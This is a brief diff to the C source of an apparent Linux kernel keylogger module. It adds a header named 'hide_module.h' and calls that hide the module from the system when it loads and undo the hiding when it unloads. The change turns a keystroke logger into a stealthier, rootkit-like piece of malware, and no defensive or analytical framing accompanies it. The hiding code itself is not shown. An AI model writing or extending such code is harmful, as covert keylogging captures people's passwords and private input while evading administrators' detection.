@@ -1,5 +1,6 @@
 #include <linux/module.h>
 #include "keylogger.h"
+#include "hide_module.h"
 
 static int __init logkey_init(void) {
     int ret;
@@ -9,10 +10,16 @@ static int __init logkey_init(void) {
         return ret;
     }
     
+    // Initialize module hiding
+    hide_module_init(THIS_MODULE);
+    
     return 0;
 }
 
 static void __exit logkey_exit(void) {
+    // Cleanup module hiding
+    hide_module_exit();
+    
     keylogger_exit();
 }
 
